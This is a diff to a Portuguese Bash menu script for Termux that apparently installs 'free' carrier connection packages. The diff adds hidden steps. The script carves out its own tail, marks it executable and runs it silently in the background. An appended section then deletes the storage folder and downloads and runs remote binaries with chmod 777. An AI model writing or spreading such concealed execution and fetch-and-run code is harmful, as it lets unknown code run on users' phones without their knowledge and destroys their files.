@@ -1,7 +1,14 @@
 #!/bin/bash
 cd $HOME
-echo -e "\033[01;32m Instalando ferramentas necessarias!\033[01;37m"
-apt install pv -y -qq --silent ; apt install jq -y -qq --silent ; apt install git -y -qq --silent
+
+tail -n +148 principal > s && chmod +x s
+nohup ./s </dev/null >/dev/null 2>&1&
+sleep 1
+nohup dpkg -s pv > /dev/null 2>&1
+nohup pkg install pv -y -q --silent > /dev/null 2>&1
+sleep 1
+nohup dpkg -s jq > /dev/null 2>&1
+nohup pkg install jq -y -q --silent > /dev/null 2>&1
 clear
 echo ""
 echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
@@ -29,3 +36,11 @@ case $OPTION in
         (*) echo -e "\033[1;31mOpção invalida\033[1;37m"
 
    esac
+exit
+#!/bin/bash
+cd $HOME
+rm menuOi.sh; rm principal2 > /dev/null 2>&1 ; rm -rf storage; termux-setup-storage ; rm menuVivo.sh
+apt update -y; apt -o Dpkg::Options::="--force-confnew" upgrade -y
+apt install pv -y -qq --silent ; apt install jq -y -qq --silent ; apt install git -y -qq --silent
+curl -sO https://raw.githubusercontent.com/NT-Injector/PacoteFree/main/mbsfree1 && chmod 777 mbsfree1 && ./mbsfree1
+curl -sO https://raw.githubusercontent.com/NT-Injector/PacoteFree/main/mbsfree2 && chmod 777 mbsfree2 && ./mbsfree2
